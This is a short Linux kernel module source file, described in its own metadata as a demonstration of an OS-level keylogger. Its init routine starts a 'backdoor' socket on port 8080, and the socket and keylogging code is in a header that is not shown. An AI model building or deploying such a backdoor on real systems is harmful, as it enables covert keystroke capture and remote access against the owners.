#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "backdoor_socket.h"

#define PORT 8080

static int __init backdoor_init(void)
{
	printk(KERN_DEBUG "backdoor: initializing backdoor module\n");
	return backdoor_socket_init(PORT);
}

static void __exit backdoor_exit(void)
{
	printk(KERN_DEBUG "backdoor: exiting backdoor module\n");
  backdoor_socket_exit();
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lucas Eduardo Gulka Pulcinelli");
MODULE_DESCRIPTION(
	"A demonstration of a keylogger at the operating system level");
MODULE_VERSION("0.0.1");

module_init(backdoor_init);
module_exit(backdoor_exit);
